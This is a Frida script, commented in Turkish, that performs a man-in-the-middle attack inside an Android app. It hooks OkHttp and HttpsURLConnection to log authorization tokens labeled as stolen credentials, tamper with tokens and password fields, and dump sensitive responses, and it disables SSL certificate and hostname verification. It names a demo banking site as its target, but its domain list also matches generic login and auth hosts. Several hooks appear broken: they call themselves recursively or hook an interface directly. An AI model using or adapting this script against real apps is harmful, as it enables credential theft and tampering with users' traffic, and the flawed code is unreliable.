Java.perform(function() {
    console.log("[🎯] Frida MITM Proxy Started");
    console.log("[⚠️]  Traffic Interception & Manipulation Active");
    
    // Tüm trafiği yakala ve manipüle et
    interceptAndModifyTraffic();
    captureSensitiveData();
    bypassSecurityMeasures();
    
    console.log("[✅] MITM tools installed");
});

function interceptAndModifyTraffic() {
    // OkHTTP trafiğini intercept et
    try {
        var OkHttpClient = Java.use("okhttp3.OkHttpClient");
        var Request = Java.use("okhttp3.Request");
        var RequestBuilder = Java.use("okhttp3.Request$Builder");
        
        OkHttpClient.newCall.implementation = function(request) {
            var originalUrl = request.url().toString();
            var method = request.method();
            
            // 1. TRAFİK YAKALAMA
            console.log("[📡] INTERCEPTED: " + method + " " + originalUrl);
            
            // 2. URL MANİPÜLASYONU (Burp gibi)
            var modifiedUrl = originalUrl;
            if (originalUrl.includes("demo.testfire.net")) {
                // Örnek: HTTP -> HTTPS yönlendirme
                modifiedUrl = originalUrl.replace("http://", "https://");
                
                // Örnek: URL parametre ekleme
                if (modifiedUrl.includes("?")) {
                    modifiedUrl += "&frida_injected=true";
                } else {
                    modifiedUrl += "?frida_injected=true";
                }
                
                console.log("[🔧] MODIFIED URL: " + modifiedUrl);
            }
            
            // 3. HEADER MANİPÜLASYONU
            var newRequestBuilder = request.newBuilder();
            
            // Header ekle/değiştir
            newRequestBuilder.removeHeader("User-Agent");
            newRequestBuilder.addHeader("User-Agent", "Frida-MITM-Agent/1.0");
            newRequestBuilder.addHeader("X-Frida-Injected", "true");
            
            // Authorization header'ını yakala
            var headers = request.headers();
            for (var i = 0; i < headers.size(); i++) {
                var name = headers.name(i);
                var value = headers.value(i);
                if (name.toLowerCase().includes("auth") || name.toLowerCase().includes("token")) {
                    console.log("[🔑] STOLEN CREDENTIAL: " + name + " = " + value);
                    // Token'ı değiştirebiliriz
                    newRequestBuilder.removeHeader(name);
                    newRequestBuilder.addHeader(name, value + "_hacked");
                }
            }
            
            // 4. BODY MANİPÜLASYONU
            try {
                var body = request.body();
                if (body) {
                    var buffer = Java.use("okhttp3.Buffer").$new();
                    body.writeTo(buffer);
                    var originalBody = buffer.readUtf8();
                    
                    console.log("[📦] ORIGINAL BODY: " + originalBody);
                    
                    // Body manipülasyonu örneği
                    if (originalBody.includes("password")) {
                        var modifiedBody = originalBody.replace(/"(password|pass)":"[^"]*"/g, '"$1":"hacked_password"');
                        console.log("[💉] MODIFIED BODY: " + modifiedBody);
                        
                        var mediaType = Java.use("okhttp3.MediaType").parse("application/json; charset=utf-8");
                        var newBody = Java.use("okhttp3.RequestBody").create(mediaType, modifiedBody);
                        newRequestBuilder.method(request.method(), newBody);
                    }
                }
            } catch (e) {}
            
            // Modified request'i oluştur
            var newRequest = newRequestBuilder.url(modifiedUrl).build();
            
            return this.newCall(newRequest);
        };
        
    } catch (e) {
        console.log("[⚠️] OkHTTP intercept error: " + e);
    }
}

function captureSensitiveData() {
    // HTTPS trafiğinden sensitive data yakala
    try {
        var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
        
        HttpsURLConnection.getInputStream.implementation = function() {
            var url = this.getURL().toString();
            
            // Response'u yakala ve oku
            var originalInputStream = this.getInputStream();
            
            // Response'u byte array olarak oku
            var buffer = Java.array('byte', new Array(1024));
            var bytesRead = originalInputStream.read(buffer);
            var responseData = "";
            
            while (bytesRead != -1) {
                responseData += String.fromCharCode.apply(null, buffer.slice(0, bytesRead));
                bytesRead = originalInputStream.read(buffer);
            }
            
            // Sensitive data ara
            if (responseData.includes("password") || responseData.includes("token") || 
                responseData.includes("credit") || responseData.includes("cookie")) {
                console.log("[🔥] SENSITIVE RESPONSE: " + responseData.substring(0, 200));
            }
            
            // InputStream'i resetle (orijinal haline döndür)
            var newInputStream = Java.use("java.io.ByteArrayInputStream").$new(
                Java.use("java.lang.String").$new(responseData).getBytes()
            );
            
            return newInputStream;
        };
        
    } catch (e) {
        console.log("[⚠️] HTTPS capture error: " + e);
    }
}

function bypassSecurityMeasures() {
    // SSL pinning ve güvenlik önlemlerini bypass et
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        
        X509TrustManager.checkServerTrusted.implementation = function(chain, authType) {
            console.log("[🔓] SSL PINNING BYPASSED: Trusting all certificates");
            // Tüm sertifikaları kabul et (tehlikeli!)
            return;
        };
        
        // Hostname verification bypass
        var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
        HostnameVerifier.verify.implementation = function(hostname, session) {
            console.log("[🔓] HOSTNAME VERIFICATION BYPASSED: " + hostname);
            return true; // Her zaman doğru dön
        };
        
    } catch (e) {
        console.log("[⚠️] Security bypass error: " + e);
    }
}

// Real-time traffic monitor
function monitorAllTraffic() {
    setInterval(function() {
        console.log("[👁️] MITM Active - Waiting for traffic...");
    }, 5000);
}

// Başlat
setTimeout(function() {
    monitorAllTraffic();
    console.log("[🎯] Ready to intercept: http://demo.testfire.net/");
    console.log("[💉] Traffic modification: ON");
    console.log("[🔓] Security bypass: ON");
}, 1000);

// Özel hedef belirleme
function targetSpecificRequests() {
    // Sadece demo.testfire.net trafiğini hedefle
    var targetDomains = [
        "demo.testfire.net",
        "owasp.org",
        "api.",
        "auth.",
        "login"
    ];
    
    return function(url) {
        return targetDomains.some(domain => url.includes(domain));
    };
}

console.log("[🎯] Frida MITM Proxy Ready!");
console.log("[⚠️]  All traffic will be intercepted and modified");